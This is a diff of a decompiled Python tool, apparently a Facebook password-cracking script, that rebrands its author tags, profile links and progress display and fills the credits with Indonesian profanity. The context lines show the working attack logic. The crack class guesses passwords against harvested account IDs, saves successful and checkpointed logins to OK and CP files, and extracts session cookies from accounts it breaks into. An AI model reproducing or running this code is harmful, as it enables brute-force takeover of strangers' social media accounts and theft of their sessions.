@@ -1,4 +1,4 @@
-# Decompile by JEECK
+# Decompile by RAKA AMANDA
 # with (uncompyle6) version : 3.7.4
 # Time Succes decompile : 2021-10-12 15:47:11.403269
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
@@ -137,15 +137,15 @@ def menu_log():
             jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
             menu_log()
         elif pf in ['1','01','001','a']:
-            os.system('xdg-open https://facebook.com/BHAIDADAHO')
+            os.system('xdg-open https://facebook.com/GARANGAN.KECHE')
             input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
             menu_log()
         elif pf in ['2','02','002','b']:
-            os.system('xdg-open https://facebook.com/BHAIDADAHO')
+            os.system('xdg-open https://facebook.com/GARANGAN.KECHE')
             input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
             menu_log()
         elif pf in ['3','03','003','c']:
-            os.system('xdg-open https://facebook.com/BHAIDADAHO')
+            os.system('xdg-open https://facebook.com/GARANGAN.KECHE')
             tutor_target()
             input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
             menu_log()
@@ -622,7 +622,7 @@ def generate4(_cici_):
     return _dapunta_
 def tambah_pass():
     print('%s║'%(O))
-    print('%s╠══[%s•%s] %sFor Example :  jeeck,123456,786786'%(O,P,O,P))
+    print('%s╠══[%s•%s] %sFor Example :  123456,786786'%(O,P,O,P))
     cuy = input('%s╠══[%s•%s] %sMasukkan Pass Tambahan Manual [1 Kata] : '%(O,P,O,P))
     gh = open('pass.txt','w')
     gh.write(cuy)
@@ -1078,7 +1078,7 @@ class crack:
                         ttl = tt["birthday"]
                         m,d,y = ttl.split("/")
                         m = bulan_ttl[m]
-                        print("\r%s[%sjeeck%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
+                        print("\r%s[%sRAKA_AMANDA%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                         self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                         open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                         break
@@ -1087,19 +1087,19 @@ class crack:
                         d = " "
                         y = " "
                     except:pass
-                    print("\r%s[%jeeck%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
+                    print("\r%s[%RAKA_AMANDA%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                     self.cp.append("%s•%s"%(fl.get("id"),i))
                     open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
                 elif log.get("status")=="success":
-                    print("\r%s[%sjeeck%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
+                    print("\r%s[%sRAKA_AMANDA%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                     self.ada.append("%s•%s"%(fl.get("id"),i))
                     open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
                 else:continue
                     
             self.ko+=1
-            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
+            print("\r%s[%sCrack%s]•>[%s%s/%s%s]•>[%sOK:%s%s]•>[%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
         except:
             self.api(fl)
     def api_opsi(self,fl):
@@ -1114,7 +1114,7 @@ class crack:
                         ttl = tt["birthday"]
                         m,d,y = ttl.split("/")
                         m = bulan_ttl[m]
-                        print("\r%s[%sjeeck%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
+                        print("\r%s[%sRAKA_AMANDA%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                         self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                         open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                         break
@@ -1123,12 +1123,12 @@ class crack:
                         d = " "
                         y = " "
                     except:pass
-                    print("\r%s[%sjeeck%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
+                    print("\r%s[%sRAKA_AMANDA%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                     self.cp.append("%s•%s"%(fl.get("id"),i))
                     open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
                 elif log.get("status")=="success":
-                    print("\r%s[%sjeeck%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
+                    print("\r%s[%sRAKA_AMANDA%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                     print("")
                     self.ada.append("%s•%s"%(fl.get("id"),i))
                     open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
@@ -1136,7 +1136,7 @@ class crack:
                 else:continue
                     
             self.ko+=1
-            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
+            print("\r%s[%sCrack%s]•>[%s%s/%s%s]•>[%sOK:%s%s]•>[%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
         except:
             self.api_opsi(fl)
     def mbasic(self,fl):
@@ -1151,7 +1151,7 @@ class crack:
                         ttl = tt["birthday"]
                         m,d,y = ttl.split("/")
                         m = bulan_ttl[m]
-                        print("\r%s[%sjeeck%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
+                        print("\r%s[%sRAKA_AMANDA%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                         self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                         open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                         break
@@ -1160,12 +1160,12 @@ class crack:
                         d = " "
                         y = " "
                     except:pass
-                    print("\r%s[%sjeeck%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
+                    print("\r%s[%sRAKA_AMANDA%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                     self.cp.append("%s•%s"%(fl.get("id"),i))
                     open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
                 elif log.get("status")=="success":
-                    h_ok = "\r%s[%sjeeck%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
+                    h_ok = "\r%s[%sRAKA_AMANDA%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                     cek_apk(h_ok,koki(log.get("cookies")))
                     self.ada.append("%s•%s"%(fl.get("id"),i))
                     open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
@@ -1173,7 +1173,7 @@ class crack:
                 else:continue
                     
             self.ko+=1
-            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
+            print("\r%s[%sCrack%s]•>[%s%s/%s%s]•>[%sOK:%s%s]•>[%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
         except:
             self.mbasic(fl)
     def mbasic_opsi(self,fl):
@@ -1188,7 +1188,7 @@ class crack:
                         ttl = tt["birthday"]
                         m,d,y = ttl.split("/")
                         m = bulan_ttl[m]
-                        h_cp = "\r%s[%sjeeck%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
+                        h_cp = "\r%s[%sRAKA_AMANDA%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                         cek_log(fl.get("id"),i,h_cp)
                         print("")
                         self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
@@ -1199,14 +1199,14 @@ class crack:
                         d = " "
                         y = " "
                     except:pass
-                    h_cp = "\r%s[%sjeeck%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id")))
+                    h_cp = "\r%s[%sRAKA_AMANDA%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id")))
                     cek_log(fl.get("id"),i,h_cp)
                     print("")
                     self.cp.append("%s•%s"%(fl.get("id"),i))
                     open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
                 elif log.get("status")=="success":
-                    h_ok = "\r%s[%sjeeck%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
+                    h_ok = "\r%s[%sRAKA_AMANDA%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                     cek_apk(h_ok,koki(log.get("cookies")))
                     print("")
                     self.ada.append("%s•%s"%(fl.get("id"),i))
@@ -1215,7 +1215,7 @@ class crack:
                 else:continue
                     
             self.ko+=1
-            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
+            print("\r%s[%sCrack%s]•>[%s%s/%s%s]•>[%sOK:%s%s]•>[%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
         except:
             self.mbasic_opsi(fl)
     def free(self,fl):
@@ -1230,7 +1230,7 @@ class crack:
                         ttl = tt["birthday"]
                         m,d,y = ttl.split("/")
                         m = bulan_ttl[m]
-                        print("\r%s[%sjeeck%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
+                        print("\r%s[%sRAKA_AMANDA%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                         self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                         open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                         break
@@ -1239,12 +1239,12 @@ class crack:
                         d = " "
                         y = " "
                     except:pass
-                    print("\r%s[%sjeeck%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
+                    print("\r%s[%sRAKA_AMANDA%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                     self.cp.append("%s•%s"%(fl.get("id"),i))
                     open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
                 elif log.get("status")=="success":
-                    h_ok = "\r%s[%sjeeck%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
+                    h_ok = "\r%s[%sRAKA_AMANDA%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                     cek_apk(h_ok,koki(log.get("cookies")))
                     self.ada.append("%s•%s"%(fl.get("id"),i))
                     open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
@@ -1252,7 +1252,7 @@ class crack:
                 else:continue
                     
             self.ko+=1
-            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
+            print("\r%s[%sCrack%s]•>[%s%s/%s%s]•>[%sOK:%s%s]•>[%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
         except:
             self.free(fl)
     def free_opsi(self,fl):
@@ -1267,7 +1267,7 @@ class crack:
                         ttl = tt["birthday"]
                         m,d,y = ttl.split("/")
                         m = bulan_ttl[m]
-                        h_cp = "\r%s[%sjeeck%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
+                        h_cp = "\r%s[%sRAKA_AMANDA%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                         cek_log(fl.get("id"),i,h_cp)
                         print("")
                         self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
@@ -1278,14 +1278,14 @@ class crack:
                         d = " "
                         y = " "
                     except:pass
-                    h_cp = "\r%s[%sjeeck%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id")))
+                    h_cp = "\r%s[%sRAKA_AMANDA%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id")))
                     cek_log(fl.get("id"),i,h_cp)
                     print("")
                     self.cp.append("%s•%s"%(fl.get("id"),i))
                     open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
                 elif log.get("status")=="success":
-                    h_ok = "\r%s[%sjeeck%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
+                    h_ok = "\r%s[%sRAKA_AMANDA%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                     cek_apk(h_ok,koki(log.get("cookies")))
                     print("")
                     self.ada.append("%s•%s"%(fl.get("id"),i))
@@ -1294,7 +1294,7 @@ class crack:
                 else:continue
                     
             self.ko+=1
-            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
+            print("\r%s[%sCrack%s]•>[%s%s/%s%s]•>[%sOK:%s%s]•>[%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
         except:
             self.free_opsi(fl)
 def target():
@@ -1577,22 +1577,22 @@ def var_author():
     mlaku('%s╔══[ %sAuthor & Team Project %s]'%(O,P,O))
     mlaku('%s║'%(O))
     mlaku('%s╠══[%s•%s] %sAuthor :'%(O,P,O,P))
-    mlaku('%s║     • %sPANTEK'%(O,P))
-    mlaku('%s║     • %sSPANTEK'%(O,P))
+    mlaku('%s║     • %sBAJINGAN'%(O,P))
+    mlaku('%s║     • %sBANGSAT'%(O,P))
     mlaku('%s║'%(O))
     mlaku('%s╠══[%s•%s] %sTeam Project %sXNSCODE%s :'%(O,P,O,P,O,P))
-    mlaku('%s║     • %sPANTEK'%(O,P))
-    mlaku('%s║     • %sPANTEK'%(O,P))
-    mlaku('%s║     • %sPANTEK'%(O,P))
-    mlaku('%s║     • %sPANTEK '%(O,P))
-    mlaku('%s║     • %sPANTEK'%(O,P))
-    mlaku('%s║     • %sPANTEK'%(O,P))
-    mlaku('%s║     • %sPANTEK'%(O,P))
-    mlaku('%s║     • %sPANTEK'%(O,P))
-    mlaku('%s║     • %sPANTEK'%(O,P))
-    mlaku('%s║     • %sPANTEK'%(O,P))
-    mlaku('%s║     • %sPANTEK'%(O,P))
-    mlaku('%s║     • %sPANTEK'%(O,P))
+    mlaku('%s║     • %sBANGSAT'%(O,P))
+    mlaku('%s║     • %sBANGSAT'%(O,P))
+    mlaku('%s║     • %sBANGSAT'%(O,P))
+    mlaku('%s║     • %sBANGSAT'%(O,P))
+    mlaku('%s║     • %sBANGSAT'%(O,P))
+    mlaku('%s║     • %sBANGSAT'%(O,P))
+    mlaku('%s║     • %sBANGSAT'%(O,P))
+    mlaku('%s║     • %sBANGSAT'%(O,P))
+    mlaku('%s║     • %sBANGSAT'%(O,P))
+    mlaku('%s║     • %sBANGSAT'%(O,P))
+    mlaku('%s║     • %sBANGSAT'%(O,P))
+    mlaku('%s║     • %sBANGSAT'%(O,P))
     mlaku('%s║'%(O))
 def var_ugen():
     print("%s╠══[%s1%s] %sGet User Agent"%(O,P,O,P))
